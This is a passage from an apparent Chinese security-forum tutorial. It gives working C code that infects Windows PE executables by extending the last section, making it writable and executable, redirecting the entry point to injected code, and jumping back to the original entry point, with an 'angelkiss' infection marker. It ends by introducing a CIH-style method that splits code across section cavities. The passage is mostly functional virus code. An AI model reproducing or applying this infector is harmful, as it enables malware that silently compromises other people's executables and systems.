
```
	//末尾节扩展感染

	PIMAGE_SECTION_HEADER lpLastSectionHeader = lpFirstSectionHeader + (dwSectionCnt-1);

	INFECT_INFO stInfectInfo = {0};

	stInfectInfo.dwId = 3;

	strncpy( stInfectInfo.lpInfectName, "文件末尾节添加方式", strlen("文件末尾节添加方式") );

			

	stInfectInfo.Infect_Manner_Info.stEndSectionExtension.dwVirtualAddSize = (DWORD)GetEndAddress - (DWORD)MainCode + dwExtendSize;

	stInfectInfo.Infect_Manner_Info.stEndSectionExtension.dwVirtualOffset = lpLastSectionHeader->VirtualAddress + lpLastSectionHeader->Misc.VirtualSize;

	stInfectInfo.Infect_Manner_Info.stEndSectionExtension.dwFileOffset = lpLastSectionHeader->PointerToRawData + lpLastSectionHeader->Misc.VirtualSize;

	stInfectInfo.Infect_Manner_Info.stEndSectionExtension.dwFileAddSize = (lpLastSectionHeader->Misc.VirtualSize+ stInfectInfo.Infect_Manner_Info.stEndSectionExtension.dwVirtualAddSize) > (lpLastSectionHeader->SizeOfRawData)?(((lpLastSectionHeader->Misc.VirtualSize + (DWORD)GetEndAddress - (DWORD)MainCode + dwExtendSize -lpLastSectionHeader->SizeOfRawData -1)/dwFileAlign+1)*dwFileAlign):0;

	stInfectInfo.dwNewEP = stInfectInfo.Infect_Manner_Info.stEndSectionExtension.dwVirtualOffset;

	stInfectInfo.lpBase = lpBuffer;

				

	stInfectInfos[dwInfectCnt++] = stInfectInfo;
```

感染的代码：

```
	if( stInfectInfos[index].dwId == 3 )

	{

		PIMAGE_DOS_HEADER lpImageDosHeader = (PIMAGE_DOS_HEADER)(stInfectInfos[index].lpBase);

		PIMAGE_NT_HEADERS lpImageNtHeaders = (PIMAGE_NT_HEADERS)( (DWORD)lpImageDosHeader + lpImageDosHeader->e_lfanew );

	    PIMAGE_SECTION_HEADER lpImageSectionHeader = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(lpImageNtHeaders);

		DWORD dwSectionCnt = lpImageNtHeaders->FileHeader.NumberOfSections;

		DWORD dwSectionAlign = lpImageNtHeaders->OptionalHeader.SectionAlignment;

		DWORD dwFileAlign = lpImageNtHeaders->OptionalHeader.FileAlignment;



		PIMAGE_SECTION_HEADER lpLastImageSectionHeader = lpImageSectionHeader + dwSectionCnt - 1;



		lpLastImageSectionHeader->Characteristics = 0xE00000E0;

		lpLastImageSectionHeader->Misc.VirtualSize += stInfectInfos[index].Infect_Manner_Info.stEndSectionExtension.dwVirtualAddSize;

		lpLastImageSectionHeader->SizeOfRawData += stInfectInfos[index].Infect_Manner_Info.stEndSectionExtension.dwFileAddSize;

		lpImageNtHeaders->OptionalHeader.SizeOfCode += stInfectInfos[index].Infect_Manner_Info.stEndSectionExtension.dwFileAddSize;

		DWORD dwOldEP = lpImageNtHeaders->OptionalHeader.AddressOfEntryPoint;

		lpImageNtHeaders->OptionalHeader.AddressOfEntryPoint = stInfectInfos[index].dwNewEP;

		lpImageNtHeaders->OptionalHeader.SizeOfImage += dwSectionAlign*(((lpLastImageSectionHeader->Misc.VirtualSize-1)/dwSectionAlign+1) - ((lpLastImageSectionHeader->Misc.VirtualSize-stInfectInfos[index].Infect_Manner_Info.stEndSectionExtension.dwVirtualAddSize-1)/dwSectionAlign+1));



		strncpy( (char*)(lpImageDosHeader->e_res2), "angelkiss", strlen("angelkiss") );

		FlushViewOfFile( stInfectInfos[index].lpBase, 0 );

		UnmapViewOfFile( stInfectInfos[index].lpBase );



		HANDLE hFile = CreateFile( g_strPath, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );

		if( hFile == NULL )

		{

			MessageBox( "添加节表感染PE失败" );

			goto _OUT;

		}

		DWORD dwFileSize = GetFileSize( hFile, NULL );

		DWORD dwRet = SetFilePointer( hFile, stInfectInfos[index].Infect_Manner_Info.stEndSectionExtension.dwFileAddSize, NULL, FILE_END );

		if( dwRet == -1 )

		{

			MessageBox( "扩大文件失败" );

			CloseHandle( hFile );

			goto _OUT;

		}

		if( !SetEndOfFile( hFile ) )

		{

			MessageBox( "扩大文件,设置文件末尾失败" );

			CloseHandle( hFile );

			goto _OUT;

		}



		DWORD dw = (DWORD)GetEndAddress - (DWORD)MainCode;



		char lpJmpCode[5] = {0xe9,0x90,0x90,0x90,0x90};

		//搜索MainCode中JMP的位置

		DWORD dwPosition = 0; 

		BYTE *lpTemp = (BYTE*)MainCode;



		for( int id = 0; id < 0x1000; id++ )

		{

			if( (*lpTemp==0x90) && (*(lpTemp+1)==0x90) && (*(lpTemp+2)==0x90) && (*(lpTemp+3)==0x90) && (*(lpTemp+4)==0x90) )

			{

				dwPosition = (DWORD)lpTemp - (DWORD)MainCode;

				break;

			}

			lpTemp++;

		}

		if( dwPosition == 0 )

		{

			MessageBox( "寻找跳转地址出错" );

			CloseHandle( hFile );

			goto _OUT;



		}

		DWORD dwJmpDis = dwOldEP  - (stInfectInfos[index].Infect_Manner_Info.stEndSectionExtension.dwVirtualOffset + dwPosition + 5 );

		memcpy( lpJmpCode+1, &dwJmpDis, 4 );

		DWORD dwOldProtect = 0;

		bool bRes = VirtualProtect( (LPVOID)(lpTemp), 5, PAGE_EXECUTE_READWRITE, &dwOldProtect );

		memcpy( lpTemp, lpJmpCode, 5 );

		SetFilePointer( hFile, stInfectInfos[index].Infect_Manner_Info.stEndSectionExtension.dwFileOffset, 0, FILE_BEGIN );

		DWORD dwCnt = 0; 

		WriteFile( hFile, (char*)MainCode, dw, &dwCnt, NULL );



		DWORD dwToken = 0xfffffff9;

        WriteFile( hFile, &dwToken, 4, &dwCnt, NULL );

		WriteFile( hFile, lpContent, strlen(lpContent), &dwCnt, NULL );

		SetFilePointer( hFile, 10, NULL, FILE_CURRENT );



		dwToken = 0xfffffffa;

		WriteFile( hFile, &dwToken, 4, &dwCnt, NULL );

		WriteFile( hFile, lpTitle, strlen(lpTitle), &dwCnt, NULL );

		SetFilePointer( hFile, 10, NULL, FILE_CURRENT );





        dwToken = 0xfffffffb;

		WriteFile( hFile, &dwToken, 4, &dwCnt, NULL );

		WriteFile( hFile, lpLoadLibraryA, strlen(lpLoadLibraryA), &dwCnt, NULL );

		SetFilePointer( hFile, 10, NULL, FILE_CURRENT );





		dwToken = 0xfffffffc;

		WriteFile( hFile, &dwToken, 4, &dwCnt, NULL );

		WriteFile( hFile, lpGetProcess, strlen(lpGetProcess), &dwCnt, NULL );

		SetFilePointer( hFile, 10, NULL, FILE_CURRENT );





		dwToken = 0xfffffffd;

		WriteFile( hFile, &dwToken, 4, &dwCnt, NULL );

		WriteFile( hFile, lpUser32, strlen(lpUser32), &dwCnt, NULL );

		SetFilePointer( hFile, 10, NULL, FILE_CURRENT );





		dwToken = 0xfffffffe;

		WriteFile( hFile, &dwToken, 4, &dwCnt, NULL );

		WriteFile( hFile, lpMessageBoxA, strlen(lpMessageBoxA), &dwCnt, NULL );

		SetFilePointer( hFile, 10, NULL, FILE_CURRENT );





		dwToken = 0xffffffff;

		WriteFile( hFile, &dwToken, 4, &dwCnt, NULL );

		WriteFile( hFile, lpExitProcess, strlen(lpExitProcess), &dwCnt, NULL );

		SetFilePointer( hFile, 10, NULL, FILE_CURRENT );



			

		CloseHandle( hFile );

		MessageBox( "文件末尾节添加方式感染成功!" );

		 

	}
```

感染前的：同上

感染后：

![](https://bbs.kanxue.com/upload/attach/201012/246960_ktttktajko1wdiu.jpg)

![](https://bbs.kanxue.com/upload/attach/201012/246960_tvoqub4d7v80pb7.jpg)

----------------------

![](https://bbs.kanxue.com/upload/attach/201012/246960_5deq0llis8fi6sj.jpg)

3、利用PE文件的节缝隙，动态感染。曾经比较流行的CIH就是利用的这种技术，但它也就是搜索节表的空隙，找个足够容纳自己的藏身。我这里是将感染代码，分割成几块，分别插入缝隙中，然后再利用`JMP`将每部分链接起来。猥琐一点！本来想自己构建一个反汇编引擎，根据缝隙大小动态划分代码，可惜没时间弄，等以后有时间了一定补上。在这里只是简单将感染代码分割成3块，然后根据缝隙大小插入，不是特别灵活！废话不多说，上代码：

获取PE文件中节缝隙大小：
